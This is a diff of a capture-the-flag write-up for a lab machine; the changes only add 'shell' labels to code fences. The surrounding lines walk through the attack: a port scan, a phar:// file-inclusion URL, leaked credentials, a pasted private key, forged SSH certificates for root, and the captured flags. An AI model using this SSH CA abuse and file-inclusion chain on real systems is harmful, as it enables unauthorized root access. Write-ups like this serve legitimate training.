@@ -9,7 +9,7 @@ date: "2024-08-20"
 
 **Port Scan**
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Resource]
 └─$ cat scan_Complete 
 # Nmap 7.94SVN scan initiated Sun Aug 11 14:52:16 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan_Complete 10.10.11.27
@@ -48,7 +48,7 @@ Upload the file on ticket system and open up its page:
 
 ![](attachment/f50a4431998e612de3034ff616a90414.png)
 
-```
+```shell
 http://itrc.ssg.htb/?page=phar://uploads/0d327960dcada2c40fb3b5c0cc99154b3963ecd4.zip/<phpfilename>
 without php extension
 ```
@@ -99,7 +99,7 @@ This box looks always broken so i decided to look a writeup and found out that s
 
 ![](attachment/836cab1aee6922d645e447bf11a51d46.png)
 
-```
+```shell
 Credentials:
 msainristil:82yards2closeit
 ```
@@ -108,7 +108,7 @@ msainristil:82yards2closeit
 
 In the decommisions_old_ca folder there is priv/pub key pair, that we are going to convert into ssh keys.
 
-```
+```shell
 ssh-keygen -t rsa -b 2048 -f keypair
 ssh-keygen -s ca-itrc -n zzinter -I kali keypair.pub 
 ```
@@ -122,7 +122,7 @@ When i was www-data i noted that was a port listening on 127.0.0.11, this usuayl
 
 RABBIT HOLE, try hard on SSH: https://shivamaharjan.medium.com/ssh-cas-and-principals-630a433d76d6
 
-```
+```shell
 ssh-keygen -t ecdsa -C "The CA" -N "" -f root_key
 ssh-keygen -s ./ca-itrc -I CA-signing -n msainristil,zzinter,root -V +1w -z 1 ./root_key.pub
 
@@ -153,13 +153,13 @@ From zzinter ssh scp this file: **sign_key_api.sh** and modify the file with vim
 
 Now sign the private key we obtained with the script, generating a certificate signed 
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Resource/zzinter_keys]
 └─$ ./sign_key_api.sh keypair.pub zzinter zzinter_temp > zzinter.cert
 ```
 
 From a writeup (i needed help) i recover this key that we will use a certificate to generate root ssh-key. Pasted it in root_ssh.cert file
-```
+```shell
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
 QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc 
@@ -172,7 +172,7 @@ QBAgM=
 
 Then login as root on your kali and sign a the private key using this certificate i provided
 
-```
+```shell
 ┌──(root㉿kali)-[/home/kali/HTB/Resource/zzinter_keys]
 └─# ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub
 Signed user key keypair-cert.pub: id "root" serial 1 for root_user valid after 2024-08-13T13:24:56
@@ -183,7 +183,7 @@ Signed user key keypair-cert.pub: id "root" serial 1 for root_user valid after 2
 
 ```
 
-```
+```shell
 ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair //Extract the pub key from private // OR
 ssh-keygen -s root_ssh.cert -z 1 -I root -V -1W:forever -n root_user keypair.pub //Use Directly the pub key
 ```
@@ -203,7 +203,7 @@ The resulting certificate is stored in `keypair-cert.pub`.
 
 ![](attachment/d9314cee50c28c2118e10e586b1ea6b8.png)
 
-```
+```shell
 user: 98a79086fe46218a7edd6abc87eb54f3
 root: 495f767f17cf87214179384c1f145b91
 ```
